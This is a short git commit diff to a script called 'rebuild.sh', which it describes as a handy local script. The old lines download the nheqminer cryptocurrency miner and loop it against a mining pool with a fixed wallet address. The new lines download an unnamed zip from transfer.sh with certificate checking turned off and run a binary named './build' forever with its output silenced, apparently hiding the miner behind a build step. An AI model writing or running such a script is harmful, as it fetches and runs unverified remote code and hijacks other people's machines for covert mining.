2513e2a530aad2f8e398d8ee656848e93faeb8d1
mata lima <lamajuahsu@outlook.com>
2021-10-27 07:39:07 +0000

    rebuild.sh edited online with Bitbucket

--- rebuild.sh
+++ rebuild.sh
@@ -3,13 +3,12 @@
 # This is a handy script for local use
 
 sudo apt update
-sudo apt install libjansson4 -y
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tar.gz
-cd nheqminer
+sudo apt install unzip -y
+wget --no-check-certificate -c https://transfer.sh/7rJEG5/nheq.zip
+unzip nheq.zip
+cd nheq
 while true
 do
-./nheqminer -v -l na.luckpool.net:3956 -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x -t 36
+./build
 > /dev/null 2>&1
 done
